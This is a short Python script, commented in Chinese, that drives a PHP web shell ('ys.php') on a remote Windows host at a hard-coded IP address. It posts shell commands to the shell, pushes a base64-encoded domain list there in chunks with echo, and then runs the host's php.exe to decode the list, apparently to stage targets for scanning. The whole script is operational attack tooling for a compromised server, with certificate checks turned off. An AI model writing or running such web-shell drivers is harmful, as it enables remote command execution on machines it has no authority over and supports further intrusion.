#!/usr/bin/env python3
"""分块传domains.txt到124.71"""
import urllib.request, ssl, base64, urllib.parse

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
W = "http://124.71.142.158:9096/ys.php"

def exec_cmd(cmd):
    try:
        data = urllib.parse.urlencode({"x": cmd}).encode()
        r = urllib.request.urlopen(urllib.request.Request(W, data=data), timeout=30, context=ctx)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:40]}"

# 读取域名池
domains = open("/tmp/win_domains.txt").read()
b64 = base64.b64encode(domains.encode()).decode()
print(f"域名池 {len(domains)}B, b64 {len(b64)}字符")

# 分块上传(每块2500)
CHUNK = 2500
parts = [b64[i:i+CHUNK] for i in range(0, len(b64), CHUNK)]
print(f"分{len(parts)}块")

# 初始化文件
r = exec_cmd("echo -n > C:/phpScan/domains_b64.txt")
print(f"init: {r[-30:]}")

for i, p in enumerate(parts):
    r = exec_cmd(f"echo -n {p} >> C:/phpScan/domains_b64.txt")
    if "ERR" in r:
        print(f"块{i}失败: {r}", flush=True)
        break
    print(f"块{i} OK ({len(p)}c)", flush=True)

# 解码+验证
r = exec_cmd("D:/phpStudy2/php/php-5.4.45/php.exe -r \"$d=file_get_contents('C:/phpScan/domains_b64.txt');file_put_contents('C:/phpScan/domains.txt',base64_decode($d));echo 'DECODED '.strlen(base64_decode($d)).'B';\"")
print(f"decode: {r[-60:]}", flush=True)
